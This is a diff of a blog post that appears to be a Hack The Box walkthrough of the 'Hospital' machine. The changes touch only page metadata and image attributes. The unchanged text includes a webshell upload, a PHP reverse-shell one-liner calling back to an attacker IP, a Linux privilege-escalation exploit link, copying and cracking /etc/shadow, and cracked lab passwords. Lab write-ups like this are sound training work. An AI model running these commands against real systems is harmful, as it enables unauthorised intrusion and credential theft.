@@ -3,6 +3,18 @@
 <head>
     <meta charset="utf-8">
     <title>HTB: Hospital | HackWithJordan</title>
+    <!-- site-meta -->
+    <meta name="description" content="Walkthrough of the Hack The Box machine Hospital, from first foothold to full compromise.">
+    <link rel="canonical" href="https://hackwithjordan.com/posts/2024-10-20-Hospital(HTB).html">
+    <meta property="og:type" content="article">
+    <meta property="og:site_name" content="HackWithJordan">
+    <meta property="og:title" content="HTB: Hospital">
+    <meta property="og:description" content="Walkthrough of the Hack The Box machine Hospital, from first foothold to full compromise.">
+    <meta property="og:url" content="https://hackwithjordan.com/posts/2024-10-20-Hospital(HTB).html">
+    <meta property="og:image" content="https://hackwithjordan.com/assets/room/poster.jpg">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta property="article:published_time" content="2024-10-20">
+    <!-- /site-meta -->
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <link rel="stylesheet" href="../assets/css/syntax.css">
     <style>
@@ -304,35 +316,35 @@
 
         <p>Port 443 is a webpage as well with a login</p>
 
-        <img alt="Screenshot 2" height="466" src="../img/posts/2024-10-20-Hospital(HTB)/02-9156f9e2fe.png" style="aspect-ratio:540/466;" width="540"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 2" height="466" src="../img/posts/2024-10-20-Hospital(HTB)/02-9156f9e2fe.png" style="aspect-ratio:540/466;" width="540"/>
 
         <p>Logo points to roundcube webmail</p>
 
-        <img alt="Screenshot 3" height="310" src="../img/posts/2024-10-20-Hospital(HTB)/03-c57c096d04.png" style="aspect-ratio:777/310;" width="777"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 3" height="310" src="../img/posts/2024-10-20-Hospital(HTB)/03-c57c096d04.png" style="aspect-ratio:777/310;" width="777"/>
 
         <p>We can create an account and login and upload files</p>
 
         <p>http://10.10.11.241:8080/index.php</p>
 
-        <img alt="Screenshot 4" height="411" src="../img/posts/2024-10-20-Hospital(HTB)/04-dca2fac6e4.png" style="aspect-ratio:815/411;" width="815"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 4" height="411" src="../img/posts/2024-10-20-Hospital(HTB)/04-dca2fac6e4.png" style="aspect-ratio:815/411;" width="815"/>
 
         <p>Fuzzing the uploads shows us a bunch of php files can be uploaded but only .phar files render the code. We can see this by the response.</p>
 
         <p>renders php code as we dont see it in the response</p>
 
-        <img alt="Screenshot 5" height="655" src="../img/posts/2024-10-20-Hospital(HTB)/05-b5203d9c90.png" style="aspect-ratio:1743/655;" width="1743"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 5" height="655" src="../img/posts/2024-10-20-Hospital(HTB)/05-b5203d9c90.png" style="aspect-ratio:1743/655;" width="1743"/>
 
         <p>php code rendered in response so its not being executed</p>
 
-        <img alt="Screenshot 6" height="460" src="../img/posts/2024-10-20-Hospital(HTB)/06-731358a1ba.png" style="aspect-ratio:1719/460;" width="1719"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 6" height="460" src="../img/posts/2024-10-20-Hospital(HTB)/06-731358a1ba.png" style="aspect-ratio:1719/460;" width="1719"/>
 
         <p>I tried for quite a while to get a shell but nothing was working. Eventually I saw an error that said “powershell not found” and I realized the website is running on a linux machine, probably in docker. I then uploaded a webshell where we can get a reverse shell using a php one liner.</p>
 
         <pre class="terminal"><code>php -r '$sock=fsockopen("10.10.14.4",443);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</code></pre>
 
-        <img alt="Screenshot 7" height="295" src="../img/posts/2024-10-20-Hospital(HTB)/07-8ebf527d20.png" style="aspect-ratio:1025/295;" width="1025"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 7" height="295" src="../img/posts/2024-10-20-Hospital(HTB)/07-8ebf527d20.png" style="aspect-ratio:1025/295;" width="1025"/>
 
-        <img alt="Screenshot 8" height="167" src="../img/posts/2024-10-20-Hospital(HTB)/08-ca5f0fcc91.png" style="aspect-ratio:524/167;" width="524"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 8" height="167" src="../img/posts/2024-10-20-Hospital(HTB)/08-ca5f0fcc91.png" style="aspect-ratio:524/167;" width="524"/>
 
         <p>Using linpeas we can get creds for the mysql database</p>
 
@@ -352,7 +364,7 @@
 
         <p>https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629/blob/main/exploit.sh</p>
 
-        <img alt="Screenshot 9" height="197" src="../img/posts/2024-10-20-Hospital(HTB)/09-5535bfd3c7.png" style="aspect-ratio:485/197;" width="485"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 9" height="197" src="../img/posts/2024-10-20-Hospital(HTB)/09-5535bfd3c7.png" style="aspect-ratio:485/197;" width="485"/>
 
         <p>Now that we are root we can copy the /etc/passwd and /etc/shadow file and crack the password for drwilliams</p>
 
@@ -362,7 +374,7 @@
 
         <pre class="terminal"><code>unshadow drwilliams_passwd drwilliams_shadow &gt; drwilliams_unshadowed.txt</code></pre>
 
-        <img alt="Screenshot 10" height="219" src="../img/posts/2024-10-20-Hospital(HTB)/10-14d941c4cd.png" style="aspect-ratio:806/219;" width="806"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 10" height="219" src="../img/posts/2024-10-20-Hospital(HTB)/10-14d941c4cd.png" style="aspect-ratio:806/219;" width="806"/>
 
         <p>drwilliams:qwe123!@#</p>
 
@@ -370,11 +382,11 @@
 
         <p>We can now login to the webmail</p>
 
-        <img alt="Screenshot 11" height="525" src="../img/posts/2024-10-20-Hospital(HTB)/11-aa8a09daf6.png" style="aspect-ratio:1308/525;" width="1308"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 11" height="525" src="../img/posts/2024-10-20-Hospital(HTB)/11-aa8a09daf6.png" style="aspect-ratio:1308/525;" width="1308"/>
 
         <p>The only thing here is an email referencing an eps file and ghost script</p>
 
-        <img alt="Screenshot 12" height="434" src="../img/posts/2024-10-20-Hospital(HTB)/12-1088fbf40a.png" style="aspect-ratio:744/434;" width="744"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 12" height="434" src="../img/posts/2024-10-20-Hospital(HTB)/12-1088fbf40a.png" style="aspect-ratio:744/434;" width="744"/>
 
         <p>We can find a CVE which has RCE</p>
 
@@ -386,15 +398,15 @@
 
         <p>Sending the email</p>
 
-        <img alt="Screenshot 13" height="711" src="../img/posts/2024-10-20-Hospital(HTB)/13-431adae414.png" style="aspect-ratio:2554/711;" width="2554"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 13" height="711" src="../img/posts/2024-10-20-Hospital(HTB)/13-431adae414.png" style="aspect-ratio:2554/711;" width="2554"/>
 
         <p>shell as drbrown</p>
 
-        <img alt="Screenshot 14" height="587" src="../img/posts/2024-10-20-Hospital(HTB)/14-d6949cbd73.png" style="aspect-ratio:1270/587;" width="1270"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 14" height="587" src="../img/posts/2024-10-20-Hospital(HTB)/14-d6949cbd73.png" style="aspect-ratio:1270/587;" width="1270"/>
 
         <p>Inside of the ghostscript.bat file we have the password for drbrown</p>
 
-        <img alt="Screenshot 15" height="148" src="../img/posts/2024-10-20-Hospital(HTB)/15-d14ee0b38a.png" style="aspect-ratio:928/148;" width="928"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 15" height="148" src="../img/posts/2024-10-20-Hospital(HTB)/15-d14ee0b38a.png" style="aspect-ratio:928/148;" width="928"/>
 
         <p>drbrown:chr!$br0wn</p>
 
@@ -408,13 +420,13 @@
 
         <p>Its running in xampp\htdocs</p>
 
-        <img alt="Screenshot 16" height="166" src="../img/posts/2024-10-20-Hospital(HTB)/16-7b4d112c7a.png" style="aspect-ratio:554/166;" width="554"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 16" height="166" src="../img/posts/2024-10-20-Hospital(HTB)/16-7b4d112c7a.png" style="aspect-ratio:554/166;" width="554"/>
 
-        <img alt="Screenshot 17" height="281" src="../img/posts/2024-10-20-Hospital(HTB)/17-ec21561c38.png" style="aspect-ratio:820/281;" width="820"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 17" height="281" src="../img/posts/2024-10-20-Hospital(HTB)/17-ec21561c38.png" style="aspect-ratio:820/281;" width="820"/>
 
-        <img alt="Screenshot 18" height="244" src="../img/posts/2024-10-20-Hospital(HTB)/18-cfdd79aa63.png" style="aspect-ratio:898/244;" width="898"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 18" height="244" src="../img/posts/2024-10-20-Hospital(HTB)/18-cfdd79aa63.png" style="aspect-ratio:898/244;" width="898"/>
 
-        <img alt="Screenshot 19" height="633" src="../img/posts/2024-10-20-Hospital(HTB)/19-059daa380d.png" style="aspect-ratio:693/633;" width="693"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 19" height="633" src="../img/posts/2024-10-20-Hospital(HTB)/19-059daa380d.png" style="aspect-ratio:693/633;" width="693"/>
     </article>
 
 <script>
